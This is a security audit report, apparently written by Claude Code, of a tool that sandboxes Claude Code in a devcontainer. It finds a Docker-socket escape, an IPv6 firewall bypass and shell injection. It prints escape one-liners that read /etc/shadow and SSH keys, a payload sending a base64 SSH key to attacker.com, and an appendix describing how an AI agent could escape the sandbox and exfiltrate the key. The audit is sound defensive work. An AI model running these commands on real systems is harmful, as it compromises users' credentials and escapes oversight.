# ClankerCage Comprehensive Security & Architecture Audit

**Version:** 3.0 (Final)
**Date:** 2025-12-11
**Auditor:** Claude Code

---

## Executive Summary

ClankerCage is a Python CLI tool that wraps Claude Code in a sandboxed devcontainer with network allowlisting. After comprehensive analysis including two internal critique cycles, I rate it **4/10** overall.

**The fundamental problem:** The Docker socket mount completely defeats the sandbox. Any code running in the container can escape to the host with a single command. This makes all other security controls theater.

**Secondary problems:** Shell injection vulnerabilities, IPv6 firewall bypass, hardcoded `--dangerously-skip-permissions`, and network sniffing via NET_ADMIN capability.

**The Good:** Well-written firewall script, zero Python dependencies, excellent test coverage ratio, thoughtful architecture.

**The Verdict:** This design cannot be made secure without removing Docker socket access. The current implementation provides a false sense of security.

---

## Table of Contents

1. [Threat Model](#1-threat-model)
2. [Critical Vulnerabilities](#2-critical-vulnerabilities)
3. [High Severity Issues](#3-high-severity-issues)
4. [Medium Severity Issues](#4-medium-severity-issues)
5. [Low Severity Issues](#5-low-severity-issues)
6. [Architecture Assessment](#6-architecture-assessment)
7. [Is Python the Right Choice?](#7-is-python-the-right-choice)
8. [Is Docker/Devcontainer the Right Approach?](#8-is-dockerdevcontainer-the-right-approach)
9. [Code Quality Analysis](#9-code-quality-analysis)
10. [CI/CD & Operations](#10-cicd--operations)
11. [Whitelisted Domains Risk Analysis](#11-whitelisted-domains-risk-analysis)
12. [Missing Features](#12-missing-features)
13. [Recommendations Summary](#13-recommendations-summary)
14. [Alternative Designs](#14-alternative-designs)

---

## 1. Threat Model

### 1.1 What Are We Protecting?

| Asset | Location | Value |
|-------|----------|-------|
| Host filesystem | `/` on host | CRITICAL |
| Cloud credentials | `~/.aws`, `~/.gcloud`, env vars | CRITICAL |
| SSH keys | `~/.ssh` | HIGH |
| Source code | Project directory | HIGH |
| API keys | `~/.claude`, environment | HIGH |
| Host network | Docker socket, NET_ADMIN | HIGH |

### 1.2 Who Is the Attacker?

| Threat Actor | Vector | Likelihood |
|--------------|--------|------------|
| **Malicious Claude response** | Claude generates code that escapes sandbox | HIGH |
| **Compromised dependency** | npm/pip package runs malicious code | MEDIUM |
| **Malicious approved domain** | User approves domain, attacker exploits it | MEDIUM |
| **Compromised base image** | Playwright image contains backdoor | LOW |

### 1.3 Security Goal

> Allow Claude Code to run with `--dangerously-skip-permissions` while preventing:
> 1. Host filesystem access beyond the project
> 2. Network access beyond whitelisted domains
> 3. Credential theft
> 4. Container escape

**Current Status:** Goals 1, 3, and 4 are NOT achieved due to Docker socket mount.

---

## 2. Critical Vulnerabilities

### 2.1 Docker Socket Mount = Complete Sandbox Escape

**Severity:** CRITICAL (10/10)
**Location:** `.devcontainer/devcontainer.json:39`

```json
"source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind"
```

**The Problem:** Any process in the container can run:

```bash
docker run -v /:/host --privileged -it alpine chroot /host
```

This gives **root access to the entire host filesystem**. The sandbox provides ZERO protection.

**What an attacker can do:**
- Read `/etc/shadow`, SSH keys, AWS credentials
- Install rootkits on the host
- Access other containers on the same host
- Pivot to other machines on the network

**How to Verify:**
```bash
# From inside container:
docker run -v /:/host alpine cat /host/etc/shadow
```

**Impact:** All other security controls are meaningless. This single issue defeats the entire security model.

**Recommendation:**
1. **Remove Docker socket mount entirely** (breaking change)
2. OR make it opt-in with explicit warning: `--enable-docker-socket`
3. OR use Docker-in-Docker with isolated daemon

### 2.2 `--dangerously-skip-permissions` Is Hardcoded

**Severity:** CRITICAL (8/10)
**Location:** `src/clankercage/cli.py:173`

```python
run_cmd = ["claude", "--dangerously-skip-permissions"] + claude_args
```

**The Problem:** This flag is always passed. Users cannot opt for a more restricted mode. The entire security model assumes this is acceptable IF the sandbox works - but the sandbox doesn't work (see 2.1).

**What `--dangerously-skip-permissions` enables:**
- Claude can execute arbitrary shell commands
- Claude can read/write any file in the container
- Claude can make network requests (filtered by firewall)
- Claude can install packages, modify system files

**Combined with Docker socket:** Claude can escape to host and do anything.

**Recommendation:**
1. Document exactly what this flag enables
2. Consider offering a `--safe-mode` that doesn't use this flag
3. At minimum, make it `--enable-dangerous-permissions` (opt-in)

### 2.3 No IPv6 Firewall Rules

**Severity:** CRITICAL (8/10)
**Location:** `.devcontainer/init-firewall.sh`

The entire firewall uses `iptables` (IPv4 only). No `ip6tables` rules exist.

**Impact:** If a whitelisted domain has AAAA records and IPv6 is enabled, traffic bypasses ALL filtering.

**How to Verify:**
```bash
# From inside container:
curl -6 https://example.com  # Should be blocked, but isn't
```

**Recommendation:** Add equivalent `ip6tables` rules or disable IPv6 entirely:
```bash
sysctl -w net.ipv6.conf.all.disable_ipv6=1
```

---

## 3. High Severity Issues

### 3.1 Shell Injection via Environment Variables

**Severity:** HIGH (7/10)
**Location:** `src/clankercage/cli.py:121-134, 157-163`

```python
# Environment variables used without sanitization
args.git_user_name = args.git_user_name or os.environ.get("CLANKER_GIT_USER_NAME")
# ...
commands.append(f"git config --global user.name '{args.git_user_name}'")
```

**Attack Vector:** On shared systems or CI environments, a less-privileged process can set environment variables that are then injected into shell commands:

```bash
export CLANKERCAGE_GIT_USER_NAME="'; curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa | base64); echo '"
clankercage  # Runs with malicious git config
```

**Impact:** Arbitrary command execution in container (which can then escape via Docker socket).

**Recommendation:**
```python
import shlex
commands.append(f"git config --global user.name {shlex.quote(args.git_user_name)}")
```

### 3.2 SSH Host Key MITM

**Severity:** HIGH (6/10)
**Location:** `.devcontainer/devcontainer.json:48`

```json
"ssh-keyscan github.com >> ~/.ssh/known_hosts 2>/dev/null"
```

**Problem:** `ssh-keyscan` fetches keys at runtime without verification. A network attacker during first startup could inject fake keys, enabling SSH key theft.

**Recommendation:** Pre-seed with known GitHub fingerprints:
```bash
# From https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/githubs-ssh-key-fingerprints
echo "github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl" >> ~/.ssh/known_hosts
```

### 3.3 `curl | bash` Installation Pattern

**Severity:** HIGH (6/10)
**Location:** `README.md`

```bash
bash <(curl -s https://raw.githubusercontent.com/clankerbot/clankercage/main/scripts/claude-code.sh)
```

**Problem:** No integrity verification. Compromised repo = compromised users.

**Recommendation:** Add checksum verification or GPG signature.

### 3.4 NET_ADMIN Enables Network Sniffing

**Severity:** HIGH (6/10)
**Location:** `.devcontainer/devcontainer.json:5-6`

```json
"--cap-add=NET_ADMIN",
"--cap-add=NET_RAW"
```

**Problem:** Combined with default Docker bridge networking, the container can:
- Sniff traffic from other containers on the same bridge
- Perform ARP spoofing
- Intercept unencrypted traffic on the Docker network

**Recommendation:** Document this risk. Consider using `--network=none` with explicit allowlist via iptables only, or use macvlan for isolation.

---

## 4. Medium Severity Issues

### 4.1 Overly Permissive Sudoers Rules

**Severity:** MEDIUM (5/10)
**Location:** `.devcontainer/Dockerfile:66-68`

```
node ALL=(root) NOPASSWD: /sbin/ipset add allowed-domains *
```

**Problem:** Wildcard allows adding any IP to the allowlist, bypassing `add-domain-to-firewall.sh` validation.

```bash
# Bypass validation, add any IP directly:
sudo /sbin/ipset add allowed-domains 1.2.3.4
```

**Mitigating factor:** Attacker needs code execution first, at which point Docker socket escape is easier.

**Recommendation:** Remove direct ipset sudo; only allow via controlled scripts.

### 4.2 `.claude` Directory Mounted Read-Write

**Severity:** MEDIUM (5/10)
**Location:** `.devcontainer/devcontainer.json:38`

```json
"source=${localEnv:HOME}/.claude,target=/home/node/.claude,type=bind"
```

**Impact:** Compromised container can modify Claude Code settings, plant hooks, steal API keys.

**Recommendation:** Consider readonly mount with specific writable subdirectories.

### 4.3 GPG Directory Mounted Read-Write

**Severity:** MEDIUM (5/10)
**Location:** `src/clankercage/cli.py:107-109`

**Impact:** Container can modify GPG keys.

**Recommendation:** Mount readonly.

### 4.4 No Container Resource Limits

**Severity:** MEDIUM (5/10)
**Location:** `.devcontainer/devcontainer.json`

No `--memory`, `--cpus`, `--pids-limit`.

**Impact:** Fork bomb, memory exhaustion, crypto mining.

**Recommendation:** Add to runArgs:
```json
"--memory=8g",
"--cpus=4",
"--pids-limit=500"
```

### 4.5 Race Condition in Cache Directory

**Severity:** MEDIUM (4/10)
**Location:** `src/clankercage/cli.py:286-300`

Multiple instances share `~/.cache/clankercage/workspace/.devcontainer/devcontainer.json`.

**Impact:** Config corruption, wrong settings applied.

**Recommendation:** Use unique session directories or file locking.

### 4.6 Suppressed Error Output

**Severity:** MEDIUM (4/10)
**Location:** `src/clankercage/cli.py:181`

```python
result = subprocess.run(exec_cmd, stderr=subprocess.DEVNULL)
```

**Impact:** Users cannot debug failures.

**Recommendation:** Remove `stderr=subprocess.DEVNULL`.

### 4.7 No SSH Key Permission Validation

**Severity:** MEDIUM (4/10)
**Location:** `src/clankercage/cli.py:271-273`

Only checks existence, not permissions (should be 0600).

**Recommendation:** Add permission check before use.

### 4.8 Base Image Not Digest-Pinned

**Severity:** MEDIUM (4/10)
**Location:** `.devcontainer/Dockerfile:2`

```dockerfile
FROM mcr.microsoft.com/playwright:v1.57.0-noble
```

**Recommendation:** Pin with digest:
```dockerfile
FROM mcr.microsoft.com/playwright:v1.57.0-noble@sha256:...
```

### 4.9 DNS Resolution Limitations

**Severity:** MEDIUM (4/10)
**Location:** `.devcontainer/init-firewall.sh:95-119`

IPs are resolved once at container start and never refreshed. If a legitimate service changes IPs (common for CDNs), access breaks. The firewall filters by destination IP, which provides defense against classic DNS rebinding attacks, but has operational limitations.

### 4.10 Temporary Files Without Cleanup

**Severity:** MEDIUM (3/10)
**Location:** `.devcontainer/init-firewall.sh:97`

Files in `/tmp/dns_*` not cleaned on error.

**Recommendation:** Use `mktemp -d` with trap cleanup.

---

## 5. Low Severity Issues

### 5.1 `safe-rm` Easily Bypassed

**Location:** `.devcontainer/safe-rm`

Only wraps `/bin/rm`. Can use `/usr/bin/rm`, Python `shutil.rmtree()`, etc.

### 5.2 No Audit Logging

No logs of approved domains, executed commands, firewall changes.

### 5.3 Hardcoded Paths

`/home/node`, `/workspace`, `/usr/local/bin/` assumed throughout.

### 5.4 No Signal Handling

CLI doesn't handle SIGTERM/SIGINT gracefully.

### 5.5 Environment Variable Exposure

`CLANKER_*` environment variables could be set by malicious processes on shared systems.

---

## 6. Architecture Assessment

### 6.1 Security Architecture: 3/10

The security model is fundamentally broken:

```
┌─────────────────────────────────────────────────────────┐
│                     HOST SYSTEM                          │
│  ┌─────────────────────────────────────────────────┐   │
│  │              Docker Socket                        │   │
│  │  (FULL HOST ACCESS - DEFEATS EVERYTHING BELOW)   │   │
│  └────────────────────┬────────────────────────────┘   │
│                       │                                  │
│  ┌────────────────────▼────────────────────────────┐   │
│  │              Container                           │   │
│  │  ┌─────────────────────────────────────────┐   │   │
│  │  │  Firewall (iptables/ipset)              │   │   │
│  │  │  - DEFAULT DROP (IPv4 only)             │   │   │
│  │  │  - Whitelist only                        │   │   │
│  │  │  - IPv6 BYPASSES EVERYTHING             │   │   │
│  │  └─────────────────────────────────────────┘   │   │
│  │                                                 │   │
│  │  ┌─────────────────────────────────────────┐   │   │
│  │  │  Claude Code                             │   │   │
│  │  │  --dangerously-skip-permissions          │   │   │
│  │  │  (arbitrary code execution)              │   │   │
│  │  └─────────────────────────────────────────┘   │   │
│  └─────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

**The Docker socket is a wormhole that bypasses every other control.**

### 6.2 Code Architecture: 8/10

Despite security issues, the code is well-organized:
- Clear separation of concerns
- Modular functions
- Good use of Python stdlib
- Defensive shell scripting

### 6.3 Firewall Implementation: 6/10

Would be excellent if not for:
- No IPv6 support
- Static IP resolution (no TTL awareness)
- Docker socket making it all moot

---

## 7. Is Python the Right Choice?

### Verdict: Yes, Python is appropriate

| Factor | Assessment |
|--------|------------|
| Distribution | `uvx` works well |
| Dependencies | Zero pip deps (excellent) |
| Complexity | 307 lines - doesn't need systems language |
| Iteration | Fast development cycle |
| Type safety | Type hints provide reasonable safety |

**Note:** Requires Node.js/npm at runtime for `npx @devcontainers/cli`.

**Future consideration:** Go would provide single binary distribution but isn't necessary at current scale.

---

## 8. Is Docker/Devcontainer the Right Approach?

### Verdict: Yes, but needs hardening

| Alternative | Isolation | Network Control | Verdict |
|-------------|-----------|-----------------|---------|
| **Devcontainer** | Good (if no docker.sock) | Excellent | Best choice |
| gVisor | Excellent | Good | Better isolation, more complex |
| Firecracker | Excellent | Excellent | Overkill for dev use |
| Bubblewrap | Medium | Poor | Can't do network filtering |
| VM | Excellent | Excellent | Too heavy for interactive use |

**Recommendation:** Keep devcontainer approach but:
1. Remove Docker socket mount
2. Add IPv6 firewall rules
3. Consider gVisor for users who need stronger isolation

---

## 9. Code Quality Analysis

### 9.1 Python CLI (`cli.py`)

| Aspect | Rating | Notes |
|--------|--------|-------|
| Type Hints | 9/10 | Excellent Python 3.10+ usage |
| Function Design | 8/10 | Small, focused functions |
| Error Handling | 4/10 | Silent failures throughout |
| Security | 3/10 | Shell injection, no input validation |
| Documentation | 5/10 | Some docstrings |

### 9.2 Shell Scripts

| Script | Rating | Notes |
|--------|--------|-------|
| `init-firewall.sh` | 8/10 | Excellent `set -euo pipefail`, good validation |
| `add-domain-to-firewall.sh` | 7/10 | Good input validation |
| `approve-domain.sh` | 7/10 | Good UX, proper TTY handling |

### 9.3 Test Coverage

- **Source LOC:** ~310
- **Test LOC:** ~960
- **Ratio:** ~3x tests vs code (excellent quantity)

**Missing Tests:**
- Shell injection edge cases
- Concurrent execution
- Invalid input handling
- Security-critical paths

---

## 10. CI/CD & Operations

### 10.1 GitHub Actions: 7/10

**Strengths:**
- Multi-arch builds (amd64, arm64)
- Dockerfile hash in cache key
- Weekly cache warming

**Weaknesses:**
- Integration tests don't run in CI (no Docker)
- No automated releases
- Hadolint non-blocking

### 10.2 Documentation: 5/10

**Missing:**
- Security model documentation
- Threat model
- Contributing guidelines
- Cross-platform guidance

---

## 11. Whitelisted Domains Risk Analysis

**Location:** `.devcontainer/whitelisted-domains.txt`

| Domain | Risk | Notes |
|--------|------|-------|
| `sentry.io` | MEDIUM | Can exfiltrate data via error reports |
| `statsig.com` | MEDIUM | Analytics endpoint, potential covert channel |
| `unpkg.com` | MEDIUM | Serves arbitrary user content |
| `cdn.jsdelivr.net` | MEDIUM | Serves arbitrary user content |
| `raw.githubusercontent.com` | LOW | Could serve malicious scripts |
| `registry.npmjs.org` | LOW | Supply chain risk |

**Recommendation:** Document that these domains are trusted and why. Consider removing CDNs that serve user content.

---

## 12. Missing Features

### High Value
1. Remove Docker socket by default
2. IPv6 firewall rules
3. Container resource limits
4. Verbose/debug mode

### Medium Value
1. Container cleanup command
2. SSH key permission validation
3. Structured logging
4. Audit log of approved domains

### Low Priority
1. macOS pf firewall support
2. Windows documentation
3. PyPI publishing

---

## 13. Recommendations Summary

### MUST FIX (Security Critical)

| # | Issue | Location | Fix |
|---|-------|----------|-----|
| 1 | Docker socket mount | devcontainer.json:39 | Remove or make opt-in |
| 2 | No IPv6 rules | init-firewall.sh | Add ip6tables or disable IPv6 |
| 3 | Shell injection | cli.py:121-134 | Use `shlex.quote()` |
| 4 | SSH host key MITM | devcontainer.json:48 | Pre-seed known fingerprints |

### SHOULD FIX (High Priority)

| # | Issue | Location | Fix |
|---|-------|----------|-----|
| 5 | Sudoers wildcards | Dockerfile:66-68 | Remove direct ipset sudo |
| 6 | No resource limits | devcontainer.json | Add --memory, --cpus, --pids-limit |
| 7 | `curl \| bash` install | README.md | Add checksum verification |
| 8 | NET_ADMIN sniffing risk | devcontainer.json:5-6 | Document or mitigate |

### NICE TO HAVE (Medium Priority)

| # | Issue | Location | Fix |
|---|-------|----------|-----|
| 9 | Suppressed stderr | cli.py:181 | Remove DEVNULL |
| 10 | GPG mount read-write | cli.py:107-109 | Make readonly |
| 11 | Base image not pinned | Dockerfile:2 | Add @sha256 digest |
| 12 | No audit logging | N/A | Add logging |

---

## 14. Alternative Designs

### 14.1 Remove Docker Socket (Recommended)

Most users don't need Docker from inside Claude. Remove the mount by default, offer `--enable-docker` for those who do with explicit warning.

### 14.2 Use gVisor Runtime

```json
"runArgs": ["--runtime=runsc"]
```

Provides kernel-level isolation. Claude cannot escape even with docker.sock (gVisor intercepts syscalls).

### 14.3 Separate Docker Daemon (Docker-in-Docker)

Run a separate Docker daemon inside the container. Slower startup but isolated from host.

---

## Appendix A: Files Reviewed

| File | Lines | Purpose |
|------|-------|---------|
| `src/clankercage/cli.py` | 307 | Main CLI |
| `.devcontainer/Dockerfile` | 103 | Container build |
| `.devcontainer/devcontainer.json` | 50 | Container config |
| `.devcontainer/init-firewall.sh` | 184 | Firewall setup |
| `.devcontainer/add-domain-to-firewall.sh` | 42 | Domain whitelist |
| `.devcontainer/whitelisted-domains.txt` | 53 | Allowed domains |
| `scripts/approve-domain.sh` | 87 | Domain approval |
| `tests/*.py` | ~960 | Test suite |
| `.github/workflows/*.yml` | ~320 | CI/CD |

## Appendix B: Attack Chain Example

**Scenario:** Claude generates malicious code

1. User runs `clankercage` on project
2. Claude Code starts with `--dangerously-skip-permissions`
3. Claude generates: `docker run -v /:/host alpine cat /host/home/user/.ssh/id_rsa`
4. Docker socket allows this command
5. SSH private key read from host filesystem
6. Claude includes key content in its response to `api.anthropic.com` (whitelisted)
7. **Result:** User's SSH key compromised

**This attack works TODAY with the current codebase.**

## Appendix C: Severity Definitions

| Severity | Rating | Description |
|----------|--------|-------------|
| CRITICAL | 8-10/10 | Sandbox escape, full host compromise |
| HIGH | 6-7/10 | Significant data exposure, privilege escalation |
| MEDIUM | 3-5/10 | Limited impact, requires conditions |
| LOW | 1-2/10 | Minor issues, defense in depth |

---

*Audit Version: 3.0 (Final)*
*Audit Date: 2025-12-11*
*Critique Cycles: 2*
